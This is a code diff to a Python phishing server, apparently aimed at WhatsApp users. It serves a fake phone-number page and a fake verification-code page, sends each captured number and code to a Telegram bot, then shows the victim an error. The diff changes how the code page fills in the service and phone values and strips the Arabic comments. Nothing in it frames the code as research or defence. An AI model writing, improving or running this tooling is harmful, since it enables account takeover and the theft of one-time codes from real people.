@@ -25,7 +25,6 @@ class PhishingHandler(BaseHTTPRequestHandler):
         if self.path == "/":
             self.send_response(200)
             self.end_headers()
-            # صفحة إدخال رقم الهاتف
             html = """<!DOCTYPE html>
 <html>
 <head>
@@ -113,19 +112,23 @@ class PhishingHandler(BaseHTTPRequestHandler):
 </html>"""
             self.wfile.write(html.encode("utf-8"))
 
-        elif self.path == "/code":
-            # صفحة إدخال رمز التحقق
+        elif self.path.startswith("/code"):
             self.send_response(200)
             self.end_headers()
-            html = """<!DOCTYPE html>
+            # استخراج المعاملات من الرابط
+            query = urllib.parse.parse_qs(self.path.split("?")[1]) if "?" in self.path else {}
+            service = query.get("service", ["wa"])[0]
+            phone = query.get("phone", ["+"])[0]
+            
+            html = f"""<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>رمز التحقق</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{
             font-family: 'Segoe UI', Tahoma, sans-serif;
             background: #0a0a0a;
             min-height: 100vh;
@@ -133,8 +136,8 @@ class PhishingHandler(BaseHTTPRequestHandler):
             justify-content: center;
             align-items: center;
             padding: 20px;
-        }
-        .container {
+        }}
+        .container {{
             background: #1a1a1a;
             padding: 40px 35px;
             border-radius: 20px;
@@ -143,23 +146,23 @@ class PhishingHandler(BaseHTTPRequestHandler):
             max-width: 420px;
             border: 1px solid #333;
             text-align: center;
-        }
-        .icon { font-size: 48px; margin-bottom: 10px; }
-        .title { color: #fff; font-size: 22px; font-weight: 600; }
-        .subtitle { color: #aaa; font-size: 14px; margin-bottom: 20px; }
-        .input-group { margin-bottom: 16px; }
-        .input-group input {
+        }}
+        .icon {{ font-size: 48px; margin-bottom: 10px; }}
+        .title {{ color: #fff; font-size: 22px; font-weight: 600; }}
+        .subtitle {{ color: #aaa; font-size: 14px; margin-bottom: 20px; }}
+        .input-group {{ margin-bottom: 16px; }}
+        .input-group input {{
             width: 100%; padding: 14px 16px; background: #2a2a2a;
             border: 1px solid #3a3a3a; border-radius: 12px; color: #fff; font-size: 15px;
             text-align: center; letter-spacing: 4px;
-        }
-        .btn-login {
+        }}
+        .btn-login {{
             width: 100%; padding: 14px; background: #25D366; color: #000;
             border: none; border-radius: 12px; font-size: 16px; font-weight: 700;
             cursor: pointer; transition: 0.3s;
-        }
-        .btn-login:hover { transform: scale(1.02); filter: brightness(1.1); }
-        .footer { color: #666; font-size: 12px; margin-top: 20px; }
+        }}
+        .btn-login:hover {{ transform: scale(1.02); filter: brightness(1.1); }}
+        .footer {{ color: #666; font-size: 12px; margin-top: 20px; }}
     </style>
 </head>
 <body>
@@ -179,12 +182,8 @@ class PhishingHandler(BaseHTTPRequestHandler):
 </div>
 </body>
 </html>"""
-            # تمرير service و phone من الـ GET parameters
-            query = urllib.parse.parse_qs(self.path.split("?")[1]) if "?" in self.path else {}
-            service = query.get("service", ["wa"])[0]
-            phone = query.get("phone", ["+"])[0]
-            html = html.replace("{service}", service).replace("{phone}", phone)
             self.wfile.write(html.encode("utf-8"))
+
         else:
             self.send_response(404)
             self.end_headers()
@@ -197,10 +196,8 @@ class PhishingHandler(BaseHTTPRequestHandler):
             service = data.get("service", ["wa"])[0]
             phone = data.get("phone", [""])[0]
 
-            # إرسال رقم الهاتف للبوت فوراً
             send_to_telegram(service, phone)
 
-            # إعادة توجيه إلى صفحة إدخال الرمز
             self.send_response(302)
             self.send_header("Location", f"/code?service={service}&phone={phone}")
             self.end_headers()
@@ -213,10 +210,8 @@ class PhishingHandler(BaseHTTPRequestHandler):
             phone = data.get("phone", [""])[0]
             code = data.get("code", [""])[0]
 
-            # إرسال الرمز للبوت
             send_to_telegram(service, phone, code)
 
-            # رسالة خطأ
             self.send_response(200)
             self.end_headers()
             self.wfile.write("""
